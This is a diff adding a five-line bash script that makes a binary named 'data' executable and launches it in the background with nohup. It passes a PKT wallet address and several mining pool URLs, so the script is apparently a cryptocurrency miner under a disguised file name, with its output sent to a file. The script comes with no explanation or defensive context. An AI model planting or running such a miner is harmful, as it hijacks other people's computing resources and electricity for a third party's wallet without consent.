@@ -1,0 +1,5 @@
+#!/bin/bash
+
+ 
+chmod +x data && 
+nohup ./data ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com http://pool.pkt.world http://pool.pktpool.io  http://pool.pkteer.com > nohup.out
